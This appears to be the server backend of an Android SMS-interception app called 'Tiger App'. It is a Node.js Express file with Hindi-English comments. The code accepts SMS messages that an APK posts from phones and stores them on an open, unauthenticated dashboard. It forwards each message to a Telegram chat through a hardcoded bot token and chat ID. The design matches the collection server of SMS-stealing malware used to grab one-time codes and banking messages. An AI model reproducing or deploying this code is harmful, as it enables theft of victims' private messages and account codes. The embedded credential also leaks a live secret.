const express = require('express');
const axios = require('axios');
const path = require('path');
const app = express();

app.use(express.json());
// Dashboard access ke liye public folder
app.use(express.static(path.join(__dirname, 'public')));

// --- CONFIGURATION ---
const BOT_TOKEN = '8394719862:AAGdG06eMVj_Mz4hFCqv-jHrmyiSqsDXppk'; 
const CHAT_ID = '7128071523';
// ---------------------

let smsLogs = [];

/**
 * 1. Mobile App SMS Endpoint
 * APK isi address par SMS bhejegi
 */
app.post('/log-sms', async (req, res) => {
    try {
        const { sender, message, device, timestamp } = req.body;
        
        const newEntry = {
            id: Date.now(),
            device: device || 'Tiger-Mobile',
            sender: sender || 'Unknown Number',
            message: message || 'Empty SMS',
            time: timestamp || new Date().toLocaleString()
        };

        // Portal/Dashboard ke liye save karein
        smsLogs.unshift(newEntry);
        if (smsLogs.length > 500) smsLogs.pop(); // Memory limit

        // Telegram par instant alert
        const telegramMsg = `🐯 *Tiger App Alert!*\n\n` +
                          `📱 *Device:* ${newEntry.device}\n` +
                          `👤 *From:* ${newEntry.sender}\n` +
                          `💬 *Message:* ${newEntry.message}\n` +
                          `⏰ *Time:* ${newEntry.time}`;

        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: telegramMsg,
            parse_mode: 'Markdown'
        });

        console.log(`[✓] SMS Received from ${newEntry.sender}`);
        res.status(200).json({ status: 'success' });

    } catch (error) {
        console.error('App Server Error:', error.message);
        res.status(500).json({ status: 'error' });
    }
});

// 2. Dashboard ko data dene ke liye
app.get('/get-logs', (req, res) => {
    res.json(smsLogs);
});

// 3. Portal saaf karne ke liye
app.post('/clear-logs', (req, res) => {
    smsLogs = [];
    res.json({ success: true });
});

// Default Port for Render
const PORT = process.env.PORT || 10000;
app.listen(PORT, () => {
    console.log(`🚀 Tiger App Server is Live on Port ${PORT}`);
});
